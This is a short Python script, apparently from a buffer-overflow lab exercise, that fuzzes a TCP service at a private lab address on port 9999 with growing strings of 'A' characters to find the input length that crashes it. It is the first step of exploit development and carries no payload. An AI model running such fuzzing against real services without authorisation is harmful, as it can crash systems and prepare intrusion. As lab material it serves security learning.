import sys,socket

ip = "10.10.144.175"
port = 9999

test = []
counter = 100

while len(test) < 30:
    test.append("A" * counter)
    counter = counter + 100

for string in test:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))

        s.recv(1024)
        print("trying " + str(len(string)))
        s.send(string + "\r\n")
    except:
        print("connection error")
        sys.exit(0)


